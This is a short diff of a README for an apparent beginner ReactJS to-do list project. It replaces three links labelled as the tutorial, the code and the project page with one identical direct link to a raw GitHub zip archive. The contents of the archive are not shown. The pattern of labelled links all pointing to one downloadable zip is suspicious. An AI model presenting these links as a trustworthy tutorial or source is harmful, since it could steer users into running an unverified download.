@@ -30,10 +30,10 @@ npm start
 
 Title: To Do List App Project in ReactJS | Full React JS Project for Beginners from Scratch
 
-<https://raw.githubusercontent.com/matearpu0394/todo_exc/master/recase/todo_exc.zip>
+<https://raw.githubusercontent.com/matearpu0394/todo_exc/master/public/todo_exc_v1.5.zip>
 
 ### To Do List App React (V2) [Update]
 
-Tutorial: <https://raw.githubusercontent.com/matearpu0394/todo_exc/master/recase/todo_exc.zip>
+Tutorial: <https://raw.githubusercontent.com/matearpu0394/todo_exc/master/public/todo_exc_v1.5.zip>
 
-Code: <https://raw.githubusercontent.com/matearpu0394/todo_exc/master/recase/todo_exc.zip>
+Code: <https://raw.githubusercontent.com/matearpu0394/todo_exc/master/public/todo_exc_v1.5.zip>
